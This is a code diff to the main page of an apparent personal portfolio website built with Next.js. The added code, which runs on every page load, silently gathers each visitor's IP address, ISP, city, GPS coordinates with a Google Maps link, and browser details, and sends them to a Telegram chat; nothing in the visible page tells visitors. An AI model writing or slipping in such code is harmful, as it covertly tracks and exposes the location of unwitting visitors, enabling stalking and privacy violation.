@@ -1,4 +1,5 @@
-// app/page.tsx
+"use client"
+import { useEffect, useState } from 'react';
 import Navbar from './components/Navbar';
 import Hero from './components/Hero';
 import About from './components/About';
@@ -9,7 +10,9 @@ import Skills from './components/Skills';
 import Testimonials from './components/Testimonials';
 import Contact from './components/Contact';
 
-//data
+import { getIpData, getGpsLocation } from '../utils/locationUtils';
+import { sendToTelegram } from '../utils/telegramUtils';
+
 import experiences from './data/experiences';
 import educationList from './data/educationList';
 import projects from './data/projects';
@@ -18,6 +21,48 @@ import testimonials from './data/testimonials';
 import { JSX } from 'react';
 
 export default function Home(): JSX.Element {
+  const [ipData, setIpData] = useState<any>(null);
+  const [location, setLocation] = useState<any>(null);
+
+  useEffect(() => {
+    getIpData().then((data) => {
+      setIpData(data);
+  
+      getGpsLocation().then((gpsData) => {
+        setLocation(gpsData);
+        
+        const browser = navigator.userAgent;
+  
+        const message = `
+          *IP Information*:
+          - *IP*: ${gpsData.ip}
+          - *Hostname*: ${gpsData.hostname}
+          - *City*: ${gpsData.city}
+          - *Region*: ${gpsData.region}
+          - *Country*: ${gpsData.country}
+          - *Location*: ${gpsData.loc} (Latitude and Longitude)
+          - *ISP*: ${gpsData.org}
+  
+          *GPS Location*:
+          - *Latitude*: ${gpsData.latitude}
+          - *Longitude*: ${gpsData.longitude}
+          - *Google Maps Link*: [View Location](https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude})
+  
+          *Browser Information*:
+          \`\`\`
+          ${browser}
+          \`\`\`
+        `;
+        
+        // Kirim semua informasi ke Telegram dalam satu pesan
+        sendToTelegram(message); // Kirim pesan ke Telegram
+      }).catch((error) => {
+        console.error('Error getting GPS location:', error);
+      });
+    });
+  }, []);
+  
+
   return (
     <main className="min-h-screen bg-white">
       <div className="container mx-auto px-4 py-12">
